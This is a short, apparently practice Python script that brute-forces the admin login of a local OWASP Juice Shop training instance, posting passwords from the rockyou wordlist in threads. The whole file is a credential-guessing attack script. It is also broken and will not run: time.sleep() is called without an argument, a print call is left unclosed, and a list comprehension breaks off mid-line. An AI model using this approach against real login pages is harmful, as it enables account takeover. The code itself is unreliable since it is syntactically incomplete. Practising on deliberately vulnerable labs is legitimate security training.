import requests
import threading
import time
#import os

maxThreads = 2
maxLines = 10
lines=[]
print("Start")
passwordfilepath='/usr/share/wordlists/rockyou.txt'
url='http://localhost:3000/rest/user/login'
#passwordfilepath='/home/crashr/git/juiceshop/sqli.txt'

with open(passwordfilepath,mode='rb') as f:
    lines = f.readlines()

runningThreads=0
allThreads=[]


# build payloads
for line in lines[0:maxLines]:
    print(f"	-build thread: {str(line, 'UTF-8').strip()}")
    def checkPassword(password):
        cleanPassword = str(password, 'UTF-8').strip()
        payload={
            'email':'admin@juice-sh.op',
            'password':cleanPassword
            }
        response = requests.post(url,payload)
        return {'status_code':response.status_code,'password':cleanPassword}
    
    newThread = threading.Thread(target=checkPassword, args=(line,))
    allThreads.append(newThread)

currentPosition=0

for t in allThreads:
    while threading.active_count() >= maxThreads:
        time.sleep()
    t.name = currentPosition
    t.start()
    while t.is_alive():
        time.sleep()
    print(t.join()
    currentPosition = currentPosition + 1
    
completedThreads = [x for x in allThreads if not x.
#        if response.status_code == 200:
#            print(f"SUCCESS: {cleanPassword}")
#            break
#        else:
#            print(f"	{cleanPassword}")
